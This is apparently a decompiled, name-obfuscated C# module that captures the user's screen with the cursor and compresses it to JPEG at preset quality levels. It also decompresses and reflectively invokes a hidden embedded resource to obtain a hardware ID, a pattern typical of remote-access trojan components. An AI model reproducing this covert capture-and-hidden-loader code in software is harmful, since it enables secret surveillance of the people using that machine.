using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class sc
{
	public static string HW = "";

	private static bool _0;

	private static int H;

	private static int W;

	private static int HH;

	private static int WW;

	public static string HWD()
	{
		if (HW.Length > 0)
		{
			return HW;
		}
		try
		{
			byte[] hWD = Resources.HWD;
			bool CM = false;
			byte[] F = API.ZIP(hWD, ref CM);
			string C = "n.C";
			string S = "HWD";
			object P = null;
			HW = Conversions.ToString(n.C.inv(ref F, ref C, ref S, ref P));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			HW = "Er";
			ProjectData.ClearProjectError();
		}
		return HW;
	}

	public static byte[] gc(ref int Q)
	{
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Expected O, but got Unknown
		if (!_0)
		{
			_0 = true;
			H = ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height;
			W = ((Computer)MyProject.Computer).get_Screen().get_Bounds().Width;
		}
		int num = default(int);
		switch (Q)
		{
		case 0:
			num = 30;
			HH = 1;
			WW = 1;
			break;
		case 1:
			num = 25;
			HH = 1;
			WW = 1;
			break;
		case 2:
			num = 20;
			HH = 1;
			WW = 1;
			break;
		case 3:
			num = 65;
			HH = 2;
			WW = 2;
			break;
		case 4:
			num = 50;
			HH = 2;
			WW = 2;
			break;
		case 5:
			num = 70;
			HH = 3;
			WW = 3;
			break;
		case 6:
			num = 40;
			HH = 3;
			WW = 3;
			break;
		case 7:
			num = 50;
			HH = 4;
			WW = 4;
			break;
		case 8:
			num = 50;
			HH = 5;
			WW = 5;
			break;
		case 9:
			num = 50;
			HH = 6;
			WW = 6;
			break;
		case 10:
			num = 50;
			HH = 9;
			WW = 9;
			break;
		}
		MemoryStream memoryStream = new MemoryStream();
		EncoderParameters val = new EncoderParameters(1);
		val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)num);
		ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
		checked(Gd((int)Math.Round((double)W / (double)WW), (int)Math.Round((double)H / (double)HH))).Save((Stream)memoryStream, encoderInfo, val);
		return memoryStream.ToArray();
	}

	public static ImageCodecInfo GetEncoderInfo(string M)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), M, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	public static Image Gd(int Wi = 0, int He = 0, bool Sh = true)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		int height = Screen.get_PrimaryScreen().get_Bounds().Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		int width2 = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
		Size size = new Size(width2, rectangle.Height);
		val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
		if (Sh)
		{
			try
			{
				Cursor @default = Cursors.get_Default();
				Point position = Cursor.get_Position();
				size = new Size(32, 32);
				rectangle = new Rectangle(position, size);
				@default.Draw(val2, rectangle);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		val2.Dispose();
		if (Wi == 0 && He == 0)
		{
			return (Image)(object)val;
		}
		Image thumbnailImage = ((Image)val).GetThumbnailImage(Wi, He, (GetThumbnailImageAbort)null, IntPtr.Zero);
		((Image)val).Dispose();
		return thumbnailImage;
	}
}
